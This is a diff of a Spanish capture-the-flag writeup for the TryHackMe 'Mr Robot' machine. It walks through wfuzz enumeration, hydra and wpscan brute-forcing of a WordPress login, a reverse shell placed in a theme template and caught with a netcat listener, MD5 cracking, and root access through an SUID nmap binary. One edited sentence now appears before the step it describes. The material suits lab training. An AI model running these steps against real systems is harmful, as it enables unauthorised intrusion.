@@ -2,7 +2,7 @@
 title: Mr Robot CTF - TryHackMe
 date: 2023-04-05
 categories: [Writeup, THM]
-tags: [Linux, THM, CTF, Medium, WordPress]
+tags: [Linux, THM, CTF, Medium, WordPress, SUID]
 img_path: /assets/img/commons/mrrobot/
 image: mrrobot.jpeg
 ---
@@ -110,21 +110,31 @@ En el reporte no nos reevela nada interesante.
 
 ### HTTP - 80
 
-Al identificar un servicio HTTP en el puerto 80, procedemos a explorar la página web correspondiente y comprobamos que se trata de una página web interactiva de la serie "*Mr Robot*" en la que se nos presenta una especie de terminal.
+Al identificar un servicio HTTP en el puerto 80, exploramos la página web y comprobamos que se trata de una página web interactiva de la serie "*Mr Robot*" en la que se nos presenta una especie de terminal.
 
 ![web](web.png)
 
 Esta terminal cuenta con un par de comandos personalizados, cada uno de ellos nos lleva diferentes directorios donde podremos ver algunas imágenes, documentos y videos de la serie *Mr Robot*. Sin embargo, nada de esto es relevante para nuestro análisis ni acceso al sistema.
 
-Examinamos cada uno de los apartados de la página y su código fuente, pero no se encontramos nada relevante.
-
 > El servicio HTTPS es un espejo del HTTP, es decir, muestran exactamente la misma información.
 {: .prompt-info }
 
-Procedemos a utilizar `wfuzz` para escanear directorios y archivos en la página web en busca de información que pudiera permitirnos acceder al servidor.
+Luego, empleamos la herramienta `wfuzz` para llevar a cabo la búsqueda de directorios y archivos en la página web mediante fuzzing.
 
 ```bash
 ❯ wfuzz -c -L -t 100 --hc=404,403 --hh=1188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.126.203/FUZZ
+```
+
+Donde:
+
+- `-c`: muestra la salida con colores.
+- `-L`: sigue las redirecciones HTTP.
+- `-t 100`: establece el número de hilos concurrentes.
+- `–hc=404,403`: oculta las respuestas HTTP con los códigos 404 y 403.
+- `w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: usa el archivo indicado como diccionario de palabras para el fuzzing.
+- `http://10.10.126.203/FUZZ`: usa la URL indicada como objetivo del fuzzing, reemplazando la palabra FUZZ por cada palabra del diccionario.
+
+```bash
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -154,23 +164,23 @@ ID           Response   Lines    Word       Chars       Payload
 000001730:   200        1 L      14 W       64 Ch       "readme"
 ```
 
-Después de realizar el fuzzing, identificamos la presencia de un portal de inicio de sesión de WordPress en `/login` en cual nos redirecciona a `/wp-login.php`.
+A partir del resultado, podemos identificar que existe un portal de inicio de sesión de WordPress en `/login`, el cual nos redirecciona a `/wp-login.php`.
 
 ![login](login.png)
 
 Una estrategia útil para enumerar usuarios válidos en WordPress es utilizar el panel de inicio de sesión, ya que aunque no conozcamos la contraseña, podemos verificar si el usuario existe. Si el intento de inicio de sesión falla, el mensaje de error que se devuelve suele incluir el nombre de usuario, como en el caso de "*The password you entered for the username admin is incorrect*", lo que sugiere que el usuario existe pero la contraseña es incorrecta.
 
-Realizamos algunas prueba con algunos usuarios por defecto pero no tuvimos éxito. 
+En este contexto, realizamos pruebas con algunos usuarios predeterminados, pero no logramos tener éxito.
 
-Otro directorio sospechoso es `/0`, al acceder al mismo identificamos el siguiente blog:
+Durante la búsqueda de directorios mediante fuzzing, también identificamos `/0` como un directorio sospechoso. Al ingresar a él, encontramos el siguiente blog:
 
 ![0](0.png)
 
-Con `Wappalyzer` realizamos la enumeracion de las tecnologias del sitio web y entre lo mas relevante obtuvimos la version de **WordPress** (`4.3.1`) y **PHP** (`5.5.29`).
+Con la herramienta `Wappalyzer`, llevamos a cabo la enumeración de las tecnologías utilizadas en el sitio web. Entre la información más relevante obtenida, destacan la versión de WordPress (`4.3.1`) y PHP (`5.5.29`).
 
 ![wappalyzer](wappalyzer.png)
 
-Seguimos enumerado otros directorios y encontramos que en el archivo `robots.txt` hay dos ubicaciones ocultas.
+Si continuamos enumerando otros directorios, descubriremos que en el archivo `robots.txt` existen dos ubicaciones ocultas.
 
 ![robots](robots.png)
 
@@ -178,7 +188,7 @@ Al acceder al archivo `key-1-of-3.txt` desde el navegador web obtenemos la prime
 
 ![key1](key1.png)
 
-Al intentar acceder a `fsocity.dic`, se descarga el archivo directamente. Al inspeccionarlo, se puede observar que se trata de un diccionario de palabras con 858160 entradas.
+Al intentar acceder a `fsocity.dic`, se descarga el archivo directamente. Al inspeccionarlo, se puede observar que se trata de un diccionario con 858160 entradas.
 
 ```bash
 ❯ head fsocity.dic
@@ -195,10 +205,7 @@ window
 ❯ wc -l fsocity.dic
 858160 fsocity.dic
 ```
-
-Podemos inferir que el propósito es llevar a cabo un ataque de fuerza bruta en el panel de WordPress.
-
-Para que este diccionario estuviera más limpio y optimizado, decidimos eliminar los nombres repetidos. Como resultado, logramos reducir el diccionario a 11451 entradas.
+Esto nos hace sospechar que el objetivo es realizar un ataque de fuerza bruta en el panel de `WordPress`. Con el fin de tener un diccionario más limpio y optimizado, podemos eliminar los nombres repetidos. Como resultado, logramos reducir el diccionario a 11451 entradas.
 
 ```bash
 ❯ sort fsocity.dic | uniq > fsocity_sorted.dic
@@ -227,6 +234,18 @@ Una vez obtenido nuestro diccionario de usuarios, procedemos a utilizar la herra
 
 ```bash
 ❯ hydra -L users.dic -p test 10.10.126.203 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.126.203%2Fwp-admin%2F&testcookie=1:F=Invalid username' -t 64
+```
+
+Donde:
+
+- `-L users.dic`: indica que se usará el archivo users.dic como una lista de nombres de usuario para probar.
+- `-p test`: indica que se usará la contraseña “test” para todos los nombres de usuario.
+- `10.10.126.203`: indica la dirección IP del servidor objetivo.
+- `http-post-form`: indica que se usará el método HTTP POST para enviar los datos del formulario.
+- `'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.126.203%2Fwp-admin%2F&testcookie=1:F=Invalid username'`: indica la ruta del formulario de inicio de sesión de WordPress, los parámetros que se enviarán con los marcadores `^USER^` y `^PASS^` que se reemplazarán por los valores de la lista y la contraseña, y el texto “Invalid username” que se usará para detectar un inicio de sesión fallido.
+- `-t 64`: indica que se usarán 64 hilos concurrentes para realizar el ataque.
+
+```bash
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-06 00:32:41
@@ -237,13 +256,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-06 00:32:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-06 00:32:43
 ```
 
-Podemos observar que el usuario `elliot` se encuentra registrado en el panel de WordPress.
-
-Una vez identificado el usuario `elliot` registrado en el panel de WordPress, el siguiente paso consiste en realizar una prueba de fuerza bruta para descubrir una contraseña válida.
+El análisis realizado nos revela que el usuario `elliot` tiene una cuenta en el panel de WordPress. Por lo tanto, a contiuación empleamos la herramienta `wpscan` para ejecutar un ataque de fuerza bruta y encontrar una contraseña válida para dicho usuario.
 
 ```bash
 ❯ wpscan --url http://10.10.126.203/wp-login.php -U elliot -P fsocity_sorted.dic -t 100
 ```
+
+Donde:
+
+- `–-url http://10.10.126.203/wp-login.php`: indica la URL del formulario de inicio de sesión de WordPress que se va a escanear.
+- `-U elliot`: indica que se usará el nombre de usuario “elliot” para probar las contraseñas.
+- `-P fsocity_sorted.dic`: indica que se usará el archivo fsocity_sorted.dic como una lista de contraseñas para probar.
+- `-t 100`: indica que se usarán 100 hilos concurrentes para realizar el escaneo.
 
 ```bash
 [...]
@@ -272,9 +296,11 @@ A continuación, se recomienda seleccionar el archivo `404.php` del lado derecho
 
 ![template](template.png)
 
-Después de haber añadido la línea de código mencionada, procedimos a actualizar el archivo modificado en el servidor. Tras una inspección detallada, determinamos que la ruta correspondiente al archivo `404.php` es `/wp-content/themes/twentyfifteen/404.php`.
+Después de agregar la línea de código mencionada, actualizamos el archivo modificado en el servidor.
 
-Para obtener acceso a la máquina, iniciamos la escucha del puerto especificado en el código (`443`) y posteriormente accedemos a la ruta `/wp-content/themes/twentyseventeen/404.php` desde el navegador.
+Realizamos una inspección minuciosa en el repositorio de WordPress y determinamos que la ruta correspondiente al archivo `404.php` es `/wp-content/themes/twentyfifteen/404.php`.
+
+Para obtener acceso a la máquina, iniciamos la escucha del puerto especificado en el código (`443`) y posteriormente accedemos a la ruta `/wp-content/themes/twentyfifteen/404.php` desde el navegador.
 
 ```bash
 ❯ nc -nlvp 443
@@ -288,7 +314,6 @@ sh: 0: can't access tty; job control turned off
 $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
-
 Después de obtener acceso al sistema como usuario `daemon`, procedemos a ejecutar el siguiente comando para obtener una shell más interactiva:
 
 ```bash
@@ -298,9 +323,7 @@ daemon@linux:/$
 
 ### Pivoting horizontal
 
-Después de acceder al sistema, se inició sesión como el usuario `daemon`, pero el usuario principal de la máquina es `robot`.
-
-Si dirigimos al directorio `/home/robot/` encontramos dos archivos interesantes.
+Accedimos al sistema como el usuario `daemon`, pero el usuario principal de la máquina es robot. Si dirigimos al directorio `/home/robot/` encontramos dos archivos interesantes.
 
 ```bash
 daemon@linux:/$ cd /home/robot/
@@ -309,16 +332,14 @@ daemon@linux:/home/robot$ ls
 ls
 key-2-of-3.txt	password.raw-md5
 ```
-
-Al intentar acceder a la segunda flag, se puede observar que no se poseen los permisos necesarios para su lectura.
+Al intentar acceder a la segunda flag, se puede observar que no poseemos los permisos necesarios para su lectura.
 
 ```bash
 daemon@linux:/home/robot$ cat key-2-of-3.txt
 cat key-2-of-3.txt
 cat: key-2-of-3.txt: Permission denied
 ```
-
-En cambio, al acceder al archivo `password.raw-md5`, se puede leer su contenido exitosamente. Por el nombre del archivo, se presume que se trata de una contraseña hasheada en formato MD5.
+En cambio, al acceder al archivo `password.raw-md5`, podemos leer su contenido exitosamente. Por el nombre del archivo, fácilmente nos damos cuenta de que se trata de una contraseña hasheada en formato MD5.
 
 ```bash
 daemon@linux:/home/robot$ cat password.raw-md5
@@ -357,7 +378,7 @@ Como usuario `robot` ya podemos leer la segunda flag.
 ```bash
 robot@linux:~$ cat key-2-of-3.txt
 cat key-2-of-3.txt
-822c73956184f694993bede3eb39f959
+822c73956184f694****************
 ```
 
 ## Escalación de privilegios
@@ -389,7 +410,7 @@ find / -perm -4000 -uid 0 -type f 2>/dev/null
 
 ### Abuso del binario nmap con SUID
 
-Nos llama la atención especialmente el binario `nmap` ****ya que no es típico que este binario posea este tipo de permisos. Si realizamos una consulta en [GTFOBins](https://gtfobins.github.io/) encontramos que con este binario podemos activar el modo interactivo, disponible en las versiones `2.02` a `5.21` y así ejecutar comandos de shell.
+Nos llama la atención especialmente el binario `nmap` ya que no es típico que este binario posea este tipo de permisos. Si realizamos una consulta en [GTFOBins](https://gtfobins.github.io/) encontramos que con este binario podemos activar el modo interactivo, disponible en las versiones `2.02` a `5.21` y así ejecutar comandos de shell.
 
 ![nmap](nmap.png)
 
@@ -402,7 +423,7 @@ robot@linux:~$ /usr/local/bin/nmap --version
 nmap version 3.81 ( http://www.insecure.org/nmap/ )
 ```
 
-Vemos que la versión del binario es vulnerable, por lo que podemos iniciar el modo interactivo y obtener una shell como usuario `root`, dado que dicho binario se ejecuta con los privilegios de dicho usuario.
+Una vez que hemos obtenido acceso como usuario `root`, podemos ingresar a su directorio principal y leer la última bandera de la máquina.
 
 ```bash
 /usr/local/bin/nmap --interactive
@@ -430,5 +451,3 @@ cat key-3-of-3.txt
 ```
 
 ¡Happy Hacking!
-
-
